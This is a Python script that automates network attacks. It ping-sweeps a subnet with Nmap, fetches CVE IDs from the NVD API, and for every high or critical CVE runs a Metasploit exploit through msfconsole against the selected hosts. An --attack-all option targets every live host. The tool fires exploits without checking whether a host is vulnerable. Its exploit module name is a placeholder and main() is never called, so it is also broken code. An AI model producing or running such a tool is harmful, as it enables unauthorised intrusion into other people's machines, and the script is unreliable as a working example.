import argparse
import nmap
import requests
import subprocess

def scan_network(network_ip):
    # Scan the network using Nmap
    nm = nmap.PortScanner()
    nm.scan(hosts=network_ip, arguments="-sn")

    # Parse the Nmap scan results and return a list of clients
    clients = []
    for host in nm.all_hosts():
        if nm[host].state() == "up":
            client = {
                "ip": host,
                "hostname": nm[host].hostname() if "hostname" in nm[host] else "",
                "vendor": nm[host].vendor() if "vendor" in nm[host] else "",
            }
            clients.append(client)
    return clients

def update_vulnerability_database():
    # Retrieve the latest vulnerability data from the NVD API
    nvd_url = "https://services.nvd.nist.gov/rest/json/cves/1.0"
    response = requests.get(nvd_url)
    json_data = response.json()

    # Extract the list of CVE numbers from the NVD data
    cve_list = []
    for item in json_data["result"]["CVE_Items"]:
        cve_list.append(item["cve"]["CVE_data_meta"]["ID"])

    # Return the list of CVE numbers
    return cve_list

def scan_vulnerabilities(client, cve_list):
    # Scan for each vulnerability in the cve_list on the target host
    for cve in cve_list:
        print(f"Scanning {client['ip']} for {cve}...")

        # Get the severity rating of the vulnerability from the NVD API
        nvd_url = f"https://services.nvd.nist.gov/rest/json/cve/1.0/{cve}"
        response = requests.get(nvd_url)
        json_data = response.json()
        severity = json_data["result"]["CVE_Items"][0]["impact"]["baseMetricV2"]["severity"]

        # Only perform the vulnerability check if the severity rating is high or critical
        if severity == "HIGH" or severity == "CRITICAL":
            # Perform the vulnerability check
            print(f"{cve} is a high or critical vulnerability. Exploiting the vulnerability...")
            # Write code to exploit the vulnerability using Metasploit
            exploit_name = "..." # Replace this with the name of the Metasploit exploit module you want to use for this vulnerability
            subprocess.run(["msfconsole", "-q", "-x", f"use exploit/{exploit_name}; set RHOST {client['ip']}; run"])

def main():
    parser = argparse.ArgumentParser(description="A simple script to scan a network for vulnerabilities and exploit them using Metasploit")
    parser.add_argument("network_ip", metavar="network_ip", type=str, help="the IP address or range to scan, in CIDR notation (e.g., 192.168.0.1/24)")
    parser.add_argument("-a", "--attack-all", action="store_true", help="attack all detected hosts without prompting for selection")
    args = parser.parse_args()

    # Scan the network for hosts
    scan_result = scan_network(args.network_ip)

    # Prompt the user to select hosts to attack
    if not args.attack_all:
        print("Detected clients:")
        for index, client in enumerate(scan_result):
            print(f"{index+1}. IP: {client['ip']} Hostname: {client['hostname']} Vendor: {client['vendor']}")
        selected_indexes = input("Enter the numbers of the clients you want to attack (comma-separated), or leave empty to attack all: ")

        if not selected_indexes:
            selected_clients = scan_result
        else:
            selected_indexes_list = [int(i.strip()) for i in selected_indexes.split(",")]
            selected_clients = [scan_result[i-1] for i in selected_indexes_list]
    else:
        selected_clients = scan_result

    # Update the vulnerability database
    cve_list = update_vulnerability_database()

    # Scan for vulnerabilities and exploit them on the selected clients
    for client in selected_clients:
        scan_vulnerabilities(client, cve_list)

    print("Done.")
